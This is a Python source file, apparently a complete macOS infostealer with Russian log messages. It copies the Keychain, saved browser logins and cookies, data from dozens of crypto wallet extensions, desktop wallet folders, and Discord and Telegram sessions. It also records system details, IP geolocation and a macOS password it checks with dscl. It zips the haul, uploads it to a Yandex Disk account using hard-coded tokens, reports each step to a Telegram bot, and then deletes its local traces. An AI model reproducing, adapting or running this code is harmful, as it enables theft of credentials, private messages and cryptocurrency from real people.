from dataclasses import dataclass
from typing import Dict, Any, Optional, List, Tuple
import shutil
import zipfile
import os
import json
import requests
import subprocess
import time
from pathlib import Path
from getpass import getuser
from shutil import copytree, copyfile
import yadisk
import logging
import threading


BuildID = "d2947c70326e0601"

# Константы для Telegram и Yandex Disk
B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
C_I: str = "5018443124"
Y_T = "y0__xCnvt7kBRjjtDcgp73l-hJcnhTP1uPeUHR-zpyLQbXcutgh0w"

# Инициализация Yandex Disk
y_d = yadisk.YaDisk(token=Y_T)

# Настройка логгера для yadisk
logger = logging.getLogger("yadisk")
logging.getLogger("yadisk").propagate = False
logger.handlers = []  # Очищаем существующие обработчики
logger.addHandler(logging.NullHandler())  # Добавляем NullHandler


def s_t_t_t(message: str) -> None:
    """Отправка сообщения в Telegram."""
    try:
        url = f"https://api.telegram.org/bot{B_T}/sendMessage"
        data = {
            'chat_id': C_I,
            'text': message
        }
        _ = requests.post(url, data=data)
    except Exception:
        pass


@dataclass
class BrowserData:
    paths: List[str]
    type: str
    base_dir: str


@dataclass
class ExtensionConfig:
    extension_id: str
    extension_name: str


@dataclass
class FoundBrowserProfile:
    path: str
    type: str
    browser_name: str


@dataclass
class FoundBrowserExtension:
    path: str
    extension_id: str
    extension_name: str
    browser_name: str


CHROMIUM_PROFILE_FILES = [
    "Login Data",
    "Cookies",
    "History",
    "Web Data",
    "Local State"
]

FIREFOX_PROFILE_FILES = [
    "logins.json",
    "key4.db",
    "cookies.sqlite"
]

BROWSER_DEFINITIONS: Dict[str, BrowserData] = {
    "Chrome": BrowserData(
        paths=["Google/Chrome"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "Firefox": BrowserData(
        paths=["Firefox/Profiles"],
        type="Gecko",
        base_dir="AppSupport"
    ),
    "Edge": BrowserData(
        paths=["Microsoft Edge"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "Brave": BrowserData(
        paths=["BraveSoftware/Brave-Browser"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "Opera": BrowserData(
        paths=["com.operasoftware.Opera"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "OperaGX": BrowserData(
        paths=["com.operasoftware.OperaGX"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "Vivaldi": BrowserData(
        paths=["Vivaldi"],
        type="Chromium",
        base_dir="AppSupport"
    ),
    "Waterfox": BrowserData(
        paths=["Waterfox/Profiles"],
        type="Gecko",
        base_dir="AppSupport"
    ),
    "Zen": BrowserData(
        paths=["zen/Profiles"],
        type="Gecko",
        base_dir="AppSupport"
    ),
}

SUPPORTED_EXTENSIONS = [
    ExtensionConfig("nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"),
    ExtensionConfig("ljfoeinjpaedjfecbmggjgodbgkmjkjk", "Trezor Wallet"),
    ExtensionConfig("fhbohimaelbohpjbbldcngcnapndodjp", "Sollet Wallet"),
    ExtensionConfig("agofbccfdbggmjhbjligajffaedmpfi", "BitKeep"),
    ExtensionConfig("oblahjcienboiocobpfmpkhgbilacbof", "MyEtherWallet (MEW)"),
    ExtensionConfig("dmkamcknogkgcdfhhbddcghachkejeap", "Keplr Wallet"),
    ExtensionConfig("eogjbkambcobpejogjednkhnkdlpjkgf", "ZenGo Wallet"),
    ExtensionConfig("ffnbelfdoeiohenkjibnmadjiehjhajb", "FoxWallet"),
    ExtensionConfig("nkpfkohfaabomajpmcikkgipnddjbjlm", "XDEFI Wallet"),
    ExtensionConfig("cjfkaebgdjmgkknhmeddmbjfkkllcfma", "Rabby Wallet"),
    ExtensionConfig("cgjclchllmlobfdhpdfbfblakllcdcp", "SafePal Wallet"),
    ExtensionConfig("cgpbghdcejifbdmicolodockpdpejkm", "D'CENT Wallet"),
    ExtensionConfig("ekpbnlianmehonjglfliphieffnpagjk", "Portis"),
    ExtensionConfig("bhemafnepdahjhdibdejjdojplpanpjm", "Clover Wallet"),
    ExtensionConfig("eobpgiikknjeagdbnljopepfkfgjcom", "Talisman Wallet"),
    ExtensionConfig("cefoeaflfeaogknfendclmchngnpadh", "MathWallet"),
    ExtensionConfig("cegnkklhnkfhpgpgdddpbglgbfjcbka", "Cyano Wallet"),
    ExtensionConfig("mfibgodchngikcneecnpcenooljdfcd", "Opera Crypto Wallet"),
    ExtensionConfig("njehdbnfdjbclbggngdihjghpknebfn", "Polkadot-JS"),
    ExtensionConfig("kgpidhfbnidjcldpngdonkekmpkgihke", "Solflare Wallet"),
    ExtensionConfig("cegmkloiabeockglkffemjljgbbannn", "Ellipal Wallet"),
    ExtensionConfig("kjklkfoolpolbnklekmicilkhigclekd", "AlphaWallet"),
    ExtensionConfig("bnnkeaggkakalmkbfbcglpggdobgfoa", "ZelCore"),
    ExtensionConfig("plnnhafklcflphmidggcldodbdennyg", "AT.Wallet"),
    ExtensionConfig("hjbkalghaiemehgdhaommgaknjmbnmf", "Loopring Wallet"),
    ExtensionConfig("dljopojhfmopnmnfocjmaiofbbifkbfb", "Halo Wallet"),
    ExtensionConfig("pghngobfhkmclhfdbemffnbihphmpcgb", "Pillar Wallet"),
    ExtensionConfig("keoamjnbgfgpkhbgmopocnkpnjkmjdd", "Ambire Wallet"),
    ExtensionConfig("nhdllgjlkgfnoianfjnbmcjmhdelknbm", "Blocto Wallet"),
    ExtensionConfig("fgdbiimlobodfabfjjnpefkafofcojmb", "Hashpack Wallet"),
    ExtensionConfig("blpcdojejhnenclebgmmbokhnccefgjm", "Defiat Wallet"),
    ExtensionConfig("kjbhfnmamllpocpbdlnpjihckcoidje", "Opera Crypto"),
    ExtensionConfig("efnhgnhicmmnchpjldjminakkdnidbop", "Titan Wallet"),
    ExtensionConfig("kmccchlcjdojdokecblnlaclhobaclj", "ONE Wallet"),
    ExtensionConfig("bpcedbkgmedfpdpcabaghjbmhjoabgmh", "MewCX"),
    ExtensionConfig("aipfkbcoemjllnfpblejkiaogfpocjba", "Frontier Wallet"),
    ExtensionConfig("nmngfmokhjdbnmdlajibgniopjpckpo", "ChainX Wallet"),
    ExtensionConfig("nehbcjigfgjgehlgimkfkknemhnhpjo", "Bifrost Wallet"),
    ExtensionConfig("ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask"),
    ExtensionConfig("ofhbbkphhbklhfoeikjpcbhemlocgigb", "Coinbase Wallet"),
    ExtensionConfig("lefigjhibehgfelfgnjcoodflmppomko", "Trust Wallet"),
    ExtensionConfig("alncdjedloppbablonallfbkeiknmkdi", "Crypto.com DeFi Wallet"),
    ExtensionConfig("bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"),
    ExtensionConfig("lpbfigbdccgjhflmccincdaihkmjjfgo", "Guarda Wallet"),
    ExtensionConfig("achbneipgfepkjolcccedghibeloocbg", "MathWallet"),
    ExtensionConfig("fdgodijdfciiljpnipkplpiogcmlbmhk", "Coin98"),
    ExtensionConfig("mcbpblocgmgfnpjjppndjkmgjaogfceg", "Binance Wallet"),
    ExtensionConfig("geceibbmmkmkmkbojpegbfakenjfoenal", "Exodus"),
    ExtensionConfig("ibnejdfjmmkpcnlpebklmnkoeoihofec", "Atomic Wallet"),
    ExtensionConfig("kjebfhglflciofebmojinmlmibbmcmkdo", "Trezor Wallet"),
    ExtensionConfig("jaoafjlleohakjimhphimldpcldhamjp", "Sollet Wallet"),
    ExtensionConfig("blnieiiffboillknjnepogjhkgnoapac", "BitKeep"),
    ExtensionConfig("odbfpeeihdkbihmopkbjmoonfanlbfcl", "MyEtherWallet (MEW)"),
    ExtensionConfig("leibnlghpgpjigganjmbkhlmehlnaedn", "Keplr Wallet"),
    ExtensionConfig("hmnminpbnkpndojhkipgkmokcocmgllb", "ZenGo Wallet"),
    ExtensionConfig("bocpokimicclglpgehgiebilfpejmgjo", "FoxWallet"),
    ExtensionConfig("ilajcdmbpocfmipjioonlmljbmljbfpj", "Rabby Wallet"),
    ExtensionConfig("hnmpcagpplmpfojmgmnngilcnanddlhb", "SafePal Wallet"),
    ExtensionConfig("ahkfhobdidabdlaphghgikhlpdbnodpa", "Portis"),
    ExtensionConfig("jihneinfbfkaopkpnifgbfdlfpnhgnko", "Clover Wallet"),
    ExtensionConfig("hpglfhgfnhbgpjdenjgmdgoeiappafln", "Talisman Wallet"),
    ExtensionConfig("cmeakgjggjdhccnmkgpjdnaefojkbgmb", "MathWallet"),
    ExtensionConfig("ffabmkklhbepgcgfonabamgnjfjdbjoo", "Cyano Wallet"),
    ExtensionConfig("cdjkjpfjcofdjfbdojhdmlflffdafngk", "Opera Crypto Wallet"),
    ExtensionConfig("apicngpmdlmkkjfbmdhpjedieibfklkf", "Polkadot-JS"),
    ExtensionConfig("lhkfcaflljdcedlgkgecfpfopgebhgmb", "Solflare Wallet"),
    ExtensionConfig("omgopbgchjlaimceodkldgajioeebhab", "Ellipal Wallet"),
    ExtensionConfig("kehbljcfpanhajpidcmblpdnlphelaie", "AlphaWallet"),
    ExtensionConfig("lnehnlppemineeojdjkcpgoockkboohn", "ZelCore"),
    ExtensionConfig("hjebgbdpfgbcjdopfbbcpcjefcmhpdpn", "Loopring Wallet"),
    ExtensionConfig("pklfcgcfchhcokldoonkijijfpgmjilh", "Halo Wallet"),
    ExtensionConfig("lplmibmljignbdmkclofcackoolcfnhj", "Pillar Wallet"),
    ExtensionConfig("kibokekadkmfjfckkbgndphcjejhoial", "Ambire Wallet"),
    ExtensionConfig("kdfmmohbkjggjlmelhhmcgohadhdeijn", "Hashpack Wallet"),
    ExtensionConfig("aoilkoeledabkfogmczlbdfhbdkoggko", "Titan Wallet"),
    ExtensionConfig("jmchmkecamhbiokiopfpjjmfkpbbjjaf", "ONE Wallet"),
    ExtensionConfig("mgffkfbidcmcenlkgaebhoojfcegdndl", "MewCX"),
    ExtensionConfig("kdgecbhaddlgffpdffafpikmjekjflff", "Frontier Wallet"),
    ExtensionConfig("pfilbfecknpnlbcioakkpcmkfckpogeg", "ChainX Wallet"),
    ExtensionConfig("mehhoobkfknjlamaohobkhfnoheajlfi", "Bifrost Wallet"),
]

COMM_APP_DEFINITIONS = {
    "Discord": "discord/Local Storage/leveldb",
    "Telegram": "Telegram Desktop/tdata",
}

CRYPTO_RELATIVE_PATHS = [
    "Exodus/exodus.wallet/",
    "electrum/wallets/",
    "Coinomi/wallets/",
    "Guarda/Local Storage/leveldb/",
    "walletwasabi/client/Wallets/",
    "atomic/Local Storage/leveldb/",
    "Ledger Live/",
    "Bitcoin",
    "Ethereum",
]


def copy_file(src: str, dst: str) -> Optional[str]:
    try:
        src_stat = os.stat(src)
        if not os.path.isfile(src):
            return f"{src} is not a regular file"

        dst_dir = os.path.dirname(dst)
        os.makedirs(dst_dir, exist_ok=True)

        with open(src, 'rb') as source, open(dst, 'wb') as destination:
            shutil.copyfileobj(source, destination)

        try:
            os.chmod(dst, src_stat.st_mode)
        except Exception as e:
            s_t_t_t(f"Не удалось установить права доступа для {dst}: {e}")

        return None

    except Exception as e:
        error_msg = f"Failed to copy {src} to {dst}: {e}"
        s_t_t_t(error_msg)
        return error_msg


def rm_dir(dir_path: str) -> Optional[str]:
    try:
        shutil.rmtree(dir_path, ignore_errors=True)
        return None
    except Exception as e:
        error_msg = f"Failed to remove directory {dir_path}: {e}"
        s_t_t_t(error_msg)
        return error_msg


def copy_dir(src: str, dst: str) -> Optional[str]:
    try:
        if not os.path.isdir(src):
            error_msg = f"{src} is not a directory"
            s_t_t_t(error_msg)
            return error_msg

        src_stat = os.stat(src)
        os.makedirs(dst, exist_ok=True)
        os.chmod(dst, src_stat.st_mode)

        for entry in os.scandir(src):
            src_path = entry.path
            dst_path = os.path.join(dst, entry.name)

            if entry.is_dir():
                error = copy_dir(src_path, dst_path)
                if error:
                    s_t_t_t(f"Ошибка при копировании поддиректории {src_path}: {error}")
                    return error
            else:
                error = copy_file(src_path, dst_path)
                if error:
                    s_t_t_t(f"Ошибка при копировании файла {src_path}: {error}")
                    return error

        return None

    except Exception as e:
        error_msg = f"Failed to copy directory {src} to {dst}: {e}"
        s_t_t_t(error_msg)
        return error_msg


def zip_dir(src: str, dst_zip_file: str) -> Optional[str]:
    try:
        if not os.path.isdir(src):
            error_msg = f"{src} is not a directory"
            s_t_t_t(error_msg)
            return error_msg

        with zipfile.ZipFile(dst_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            src_path = Path(src)
            base_dir = src_path.name

            for root, _, files in os.walk(src):
                rel_root = Path(root).relative_to(src_path.parent)
                if str(rel_root) == ".":
                    continue

                zip_dir_path = str(Path(base_dir) / rel_root)
                zipf.write(root, zip_dir_path + "/")

                for file in files:
                    file_path = Path(root) / file
                    zip_file_path = str(Path(base_dir) / rel_root / file)
                    zipf.write(file_path, zip_file_path)

        return None

    except Exception as e:
        error_msg = f"Failed to create zip file {dst_zip_file} from {src}: {e}"
        s_t_t_t(error_msg)
        return error_msg


def check_keychain_directories(home_dir: str) -> List[str]:
    found_dirs = []
    keychain_dir = os.path.join(home_dir, "Library", "Keychains")

    try:
        if os.path.isdir(keychain_dir):
            found_dirs.append(keychain_dir)
    except Exception as e:
        s_t_t_t(f"Ошибка при проверке Keychain: {e}")

    return found_dirs


def check_communication_app_directories(home_dir: str) -> List[str]:
    found_dirs = []
    app_support_dir = os.path.join(home_dir, "Library", "Application Support")

    for app_name, rel_path in COMM_APP_DEFINITIONS.items():
        path = os.path.join(app_support_dir, rel_path)
        try:
            if os.path.isdir(path):
                found_dirs.append(path)
        except Exception as e:
            s_t_t_t(f"Ошибка при проверке директории {app_name}: {e}")

    return found_dirs


def check_macos_directories() -> List[str]:
    try:
        home_dir = os.path.expanduser("~")
    except Exception as e:
        s_t_t_t(f"Ошибка получения домашней директории: {e}")
        return []

    all_found_dirs = []

    try:
        keychain_dirs = check_keychain_directories(home_dir)
        all_found_dirs.extend(keychain_dirs)
    except Exception as e:
        s_t_t_t(f"Ошибка при проверке Keychain директорий: {e}")

    try:
        browser_profiles, browser_extensions = check_browser_directories(home_dir)
        all_found_dirs.extend(profile.path for profile in browser_profiles)
        all_found_dirs.extend(extension.path for extension in browser_extensions)
    except Exception as e:
        s_t_t_t(f"Ошибка при проверке браузеров: {e}")

    try:
        comm_dirs = check_communication_app_directories(home_dir)
        all_found_dirs.extend(comm_dirs)
    except Exception as e:
        s_t_t_t(f"Ошибка при проверке коммуникационных приложений: {e}")

    try:
        crypto_dirs = check_crypto_directories(home_dir)
        all_found_dirs.extend(crypto_dirs)
    except Exception as e:
        s_t_t_t(f"Ошибка при проверке криптовалютных директорий: {e}")

    unique_dirs = list(dict.fromkeys(all_found_dirs))
    return unique_dirs


def check_crypto_directories(home_dir: str) -> List[str]:
    found_dirs = []
    app_support_dir = os.path.join(home_dir, "Library", "Application Support")

    for rel_path in CRYPTO_RELATIVE_PATHS:
        dir_path = os.path.join(app_support_dir, rel_path)
        try:
            if os.path.isdir(dir_path):
                found_dirs.append(dir_path)
        except Exception as e:
            s_t_t_t(f"Ошибка при проверке {dir_path}: {e}")

    return found_dirs


def check_browser_directories(home_dir: str) -> Tuple[List[FoundBrowserProfile], List[FoundBrowserExtension]]:
    found_profiles = []
    found_extensions = []
    app_support_dir = os.path.join(home_dir, "Library", "Application Support")

    for browser_name, data in BROWSER_DEFINITIONS.items():
        base_dir = app_support_dir if data.base_dir == "AppSupport" else home_dir

        for rel_path in data.paths:
            path = os.path.join(base_dir, rel_path)

            if data.type == "Gecko":
                if os.path.basename(path) == "Profiles":
                    try:
                        for entry in os.scandir(path):
                            if entry.is_dir():
                                profile_path = os.path.join(path, entry.name)
                                found_sensitive_file = False
                                for file in FIREFOX_PROFILE_FILES:
                                    if os.path.exists(os.path.join(profile_path, file)):
                                        found_sensitive_file = True
                                        break
                                if found_sensitive_file:
                                    found_profiles.append(FoundBrowserProfile(
                                        path=profile_path,
                                        type=data.type,
                                        browser_name=browser_name
                                    ))
                    except FileNotFoundError:
                        s_t_t_t(f"Директория {path} не найдена")
                    except Exception as e:
                        s_t_t_t(f"Ошибка при проверке профиля Gecko {path}: {e}")

            elif data.type == "Chromium":
                try:
                    if os.path.isdir(path):
                        for entry in os.scandir(path):
                            if entry.is_dir() and (entry.name == "Default" or entry.name.startswith("Profile")):
                                profile_path = os.path.join(path, entry.name)
                                found_sensitive_file = False
                                for file in CHROMIUM_PROFILE_FILES:
                                    if os.path.exists(os.path.join(profile_path, file)):
                                        found_sensitive_file = True
                                        break
                                if found_sensitive_file:
                                    found_profiles.append(FoundBrowserProfile(
                                        path=profile_path,
                                        type=data.type,
                                        browser_name=browser_name
                                    ))
                                    for extension in SUPPORTED_EXTENSIONS:
                                        ext_path = os.path.join(profile_path, "Local Extension Settings",
                                                                extension.extension_id)
                                        if os.path.exists(ext_path):
                                            found_extensions.append(FoundBrowserExtension(
                                                path=ext_path,
                                                extension_id=extension.extension_id,
                                                extension_name=extension.extension_name,
                                                browser_name=f"{browser_name}/{entry.name}"
                                            ))
                except FileNotFoundError:
                    s_t_t_t(f"Директория {path} не найдена")
                except Exception as e:
                    s_t_t_t(f"Ошибка при проверке профиля Chromium {path}: {e}")

    return found_profiles, found_extensions


def upload_file(file_path: str) -> Optional[str]:
    s_t_t_t(f"Начало загрузки файла на Yandex Disk: {file_path}")
    try:
        if not os.path.exists(file_path):
            error_msg = f"Файл {file_path} не существует"
            s_t_t_t(error_msg)
            return error_msg

        s_t_t_t(f"Размер файла: {os.path.getsize(file_path)} байт")

        if not y_d.check_token():
            error_msg = "Недействительный токен Yandex Disk"
            s_t_t_t(error_msg)
            return error_msg

        remote_folder = "/macoss"
        if not y_d.exists(remote_folder):
            y_d.mkdir(remote_folder)
            s_t_t_t(f"Создана папка на Yandex Disk: {remote_folder}")

        base_name = Path(file_path).stem
        temp_remote_path = f"{remote_folder}/{base_name}.tmp"
        final_remote_path = f"{remote_folder}/{base_name}.zip"

        s_t_t_t(f"Загружаем как {temp_remote_path}")
        y_d.upload(file_path, temp_remote_path, overwrite=True)
        s_t_t_t(f"Файл успешно загружен на Yandex Disk как {temp_remote_path}")

        y_d.move(temp_remote_path, final_remote_path, overwrite=True)
        s_t_t_t(f"Файл переименован в {final_remote_path}")

        y_d.publish(final_remote_path)
        public_link = y_d.get_meta(final_remote_path).public_url

        if not public_link:
            s_t_t_t("Не удалось получить публичную ссылку")

        return None

    except Exception as e:
        error_msg = f"Не удалось загрузить файл {file_path} на Yandex Disk: {str(e)}"
        s_t_t_t(error_msg)
        return error_msg


def get_ip_info() -> Dict[str, Any]:
    geo_info = {}
    try:
        geo_response = requests.get("https://freeipapi.com/api/json/")
        if geo_response.status_code == 200:
            geo_info = geo_response.json()
    except Exception as e:
        s_t_t_t(f"Ошибка получения гео-информации: {e}")

    try:
        ip_response = requests.get("https://api.ipify.org/?format=json")
        if ip_response.status_code == 200:
            public_ip_info = ip_response.json()
            if 'ip' in public_ip_info:
                geo_info['ipAddress'] = public_ip_info['ip']
    except Exception as e:
        s_t_t_t(f"Ошибка получения публичного IP: {e}")

    return geo_info


def run_command(command: str, *args: str) -> Optional[str]:
    try:
        result = subprocess.run([command] + list(args), capture_output=True, text=True)
        if result.returncode != 0:
            error_msg = f"Ошибка команды: {command} {' '.join(args)} - {result.stderr.strip()}"
            s_t_t_t(error_msg)
            return error_msg
        return result.stdout.strip()
    except Exception as e:
        error_msg = f"Не удалось выполнить команду {command}: {e}"
        s_t_t_t(error_msg)
        return error_msg


def get_macos_password_via_applescript(password: str | None) -> Optional[str]:
    username = getuser()
    max_attempts = 5
    for attempt in range(1, max_attempts + 1):
        if password:
            is_valid, verify_err = verify_password(username, password)
            if verify_err:
                s_t_t_t(f"Ошибка проверки пароля: {verify_err}")
                time.sleep(1)
                continue
            if is_valid:
                return password
            else:
                s_t_t_t("Пароль неверный")
        else:
            s_t_t_t("Пароль не предоставлен")
    s_t_t_t("Не удалось получить пароль macOS после всех попыток")
    return password


def collect_system_info(password: str, build_id: str, output_path: str) -> Optional[str]:
    system_info = {}

    profile_data = run_command("system_profiler", "SPSoftwareDataType", "SPHardwareDataType")
    if profile_data:
        lines = profile_data.splitlines()
        for line in lines:
            trimmed_line = line.strip()
            if not trimmed_line or ':' not in trimmed_line:
                continue
            key, value = map(str.strip, trimmed_line.split(':', 1))
            if key and value:
                system_info[key] = value
    else:
        system_info["profiler_error"] = "Не удалось выполнить system_profiler"
        s_t_t_t("Ошибка выполнения system_profiler")

    ip_info = get_ip_info()
    if ip_info:
        system_info["ip_info"] = ip_info
    else:
        system_info["ip_info"] = {"error": "Не удалось получить информацию об IP"}

    mac_password = get_macos_password_via_applescript(password)
    if mac_password:
        system_info["system_password"] = mac_password
    else:
        system_info["system_password_error"] = "Не удалось получить пароль macOS"

    system_info["BUILD_ID"] = build_id
    system_info["system_os"] = "macos"

    system_output_path = Path(output_path) / "System"
    system_output_path.mkdir(parents=True, exist_ok=True)

    file_path = system_output_path / "system_info.json"
    with open(file_path, 'w') as f:
        json.dump(system_info, f, indent=2)

    return None


def execute_applescript(script: str) -> Optional[str]:
    try:
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        if result.returncode != 0:
            error_msg = f"Ошибка выполнения AppleScript: {result.stderr.strip()}"
            s_t_t_t(error_msg)
            return error_msg
        return result.stdout.strip()
    except Exception as e:
        error_msg = f"Не удалось выполнить AppleScript: {e}"
        s_t_t_t(error_msg)
        return error_msg


def verify_password(username: str, password: str) -> tuple[bool, Optional[str]]:
    if not username or not password:
        error_msg = "Имя пользователя и пароль не могут быть пустыми"
        s_t_t_t(error_msg)
        return False, error_msg

    try:
        result = subprocess.run(['dscl', '/Local/Default', '-authonly', username, password],
                                capture_output=True, text=True)
        if result.returncode == 0:
            s_t_t_t("Пароль успешно проверен")
            return True, None
        else:
            s_t_t_t("Пароль неверный")
            return False, None
    except Exception as e:
        error_msg = f"Не удалось выполнить команду dscl: {e}"
        s_t_t_t(error_msg)
        return False, error_msg


def extract_browser_data(profile: FoundBrowserProfile, output_base_dir: str) -> Optional[str]:
    targets = []
    if profile.type == "Chromium":
        targets = [
            "Login Data",
            "History",
            "Web Data",
            "Cookies",
            os.path.join("Network", "Cookies"),
            "Local State",
            "Local Storage",
            "Session Storage",
        ]
    elif profile.type == "Gecko":
        targets = [
            "formhistory.sqlite",
            "logins.json",
            "cookies.sqlite",
            "places.sqlite",
            "key4.db",
        ]
    else:
        error_msg = f"Неподдерживаемый тип браузера для извлечения: {profile.type}"
        s_t_t_t(error_msg)
        return error_msg

    profile_name = Path(profile.path).name
    dest_dir = Path(output_base_dir) / profile.browser_name / profile_name
    dest_dir.mkdir(parents=True, exist_ok=True)

    extraction_errors = 0
    for target in targets:
        src_path = Path(profile.path) / target
        dst_path = dest_dir / target

        if not src_path.exists():
            continue

        if src_path.is_dir():
            try:
                copytree(src_path, dst_path, dirs_exist_ok=True)
            except Exception as e:
                extraction_errors += 1
                s_t_t_t(f"Ошибка копирования директории {src_path}: {e}")
        else:
            try:
                copyfile(src_path, dst_path)
            except Exception as e:
                extraction_errors += 1
                s_t_t_t(f"Ошибка копирования файла {src_path}: {e}")

    if extraction_errors > 0:
        error_msg = f"Извлечение завершено для {profile.browser_name}/{profile_name} с {extraction_errors} ошибками"
        s_t_t_t(error_msg)
        return error_msg
    return None


def create_output_dir(path: str) -> bool:
    try:
        os.makedirs(path, exist_ok=True)
        return True
    except Exception as e:
        s_t_t_t(f"Ошибка создания директории {path}: {e}")
        return False


def s_mc(password: str | None):
    base_output_dir = "out"
    zip_file_name = "output.zip"

    out_paths: Dict[str, str] = {
        "Base": base_output_dir,
        "Browsers": os.path.join(base_output_dir, "Browsers"),
        "Keychain": os.path.join(base_output_dir, "Keychain"),
        "Comms": os.path.join(base_output_dir, "Communication"),
        "Crypto": os.path.join(base_output_dir, "Crypto"),
        "System": os.path.join(base_output_dir, "System"),
    }

    try:
        shutil.rmtree(out_paths["Base"], ignore_errors=True)
    except Exception as e:
        s_t_t_t(f"Ошибка очистки базовой директории: {e}")

    try:
        os.remove(zip_file_name)
    except FileNotFoundError:
        s_t_t_t(f"Архив {zip_file_name} не существует")
    except Exception as e:
        s_t_t_t(f"Ошибка удаления архива {zip_file_name}: {e}")

    try:
        home_dir = os.path.expanduser("~")
    except Exception as e:
        return

    for category, path in out_paths.items():
        if category != "Base":
            if not create_output_dir(path):
                return

    try:
        collect_system_info(password, BuildID, out_paths["Base"])
    except Exception as e:
        s_t_t_t(f"Ошибка при сборе системной информации: {e}")

    try:
        paths = check_keychain_directories(home_dir)
        for dir_path in paths:
            dst_path = os.path.join(out_paths["Keychain"], os.path.basename(dir_path))
            try:
                copy_dir(dir_path, dst_path)
            except Exception as e:
                s_t_t_t(f"Ошибка копирования Keychain директории {dir_path}: {e}")
    except Exception as e:
        s_t_t_t(f"Ошибка при обработке Keychain директорий: {e}")

    try:
        browser_profiles, browser_extensions = check_browser_directories(home_dir)

        extraction_errors = 0
        for profile in browser_profiles:
            try:
                extract_browser_data(profile, out_paths["Browsers"])
            except Exception as e:
                extraction_errors += 1
                s_t_t_t(f"Ошибка извлечения данных профиля {profile.browser_name}: {e}")
        for extension in browser_extensions:
            try:
                dst_path = os.path.join(out_paths["Browsers"], extension.browser_name, extension.extension_id,
                                        extension.extension_name)
                copy_dir(extension.path, dst_path)
            except Exception as e:
                extraction_errors += 1
                s_t_t_t(f"Ошибка копирования расширения {extension.extension_name}: {e}")
    except Exception as e:
        s_t_t_t(f"Ошибка при обработке браузеров: {e}")

    try:
        comm_dirs = check_communication_app_directories(home_dir)
        copy_errors = 0
        for dir_path in comm_dirs:
            dst_path = os.path.join(out_paths["Comms"], os.path.basename(dir_path))
            try:
                copy_dir(dir_path, dst_path)
            except Exception as e:
                copy_errors += 1
                s_t_t_t(f"Ошибка копирования {dir_path}: {e}")
    except Exception as e:
        s_t_t_t(f"Ошибка при обработке коммуникационных приложений: {e}")

    try:
        crypto_dirs = check_crypto_directories(home_dir)
        for dir_path in crypto_dirs:
            dst_path = os.path.join(out_paths["Crypto"], os.path.basename(dir_path))
            try:
                copy_dir(dir_path, dst_path)
            except Exception as e:
                copy_errors += 1
                s_t_t_t(f"Ошибка копирования {dir_path}: {e}")
    except Exception as e:
        s_t_t_t(f"Ошибка при обработке криптовалютных директорий: {e}")

    try:
        s_t_t_t(f"Создание архива {zip_file_name}")
        zip_dir(out_paths["Base"], zip_file_name)
    except Exception as e:
        return

    try:
        result = upload_file(zip_file_name)
        if result:
            s_t_t_t(f"Ошибка загрузки архива: {result}")
        else:
            pass
        try:
            os.remove(zip_file_name)
            s_t_t_t(f"Архив {zip_file_name} удален после загрузки")
        except Exception as e:
            s_t_t_t(f"Ошибка удаления архива {zip_file_name}: {e}")
    except Exception as e:
        s_t_t_t(f"Общая ошибка при загрузке архива: {e}")
        try:
            os.remove(zip_file_name)
            s_t_t_t(f"Архив {zip_file_name} удален после ошибки")
        except FileNotFoundError:
            s_t_t_t(f"Архив {zip_file_name} не существует для удаления")
        except Exception as remove_err:
            s_t_t_t(f"Ошибка удаления архива {zip_file_name}: {remove_err}")
        return

    try:
        s_t_t_t(f"Очистка базовой директории {out_paths['Base']}")
        shutil.rmtree(out_paths["Base"], ignore_errors=True)
        s_t_t_t(f"Базовая директория {out_paths['Base']} очищена")
    except Exception as e:
        s_t_t_t(f"Ошибка очистки базовой директории: {e}")

    s_t_t_t("Программа успешно завершена")

def run_s_mc_in(password: str | None):
    thread = threading.Thread(target=s_mc, args=(password,))
    thread.start()
    return thread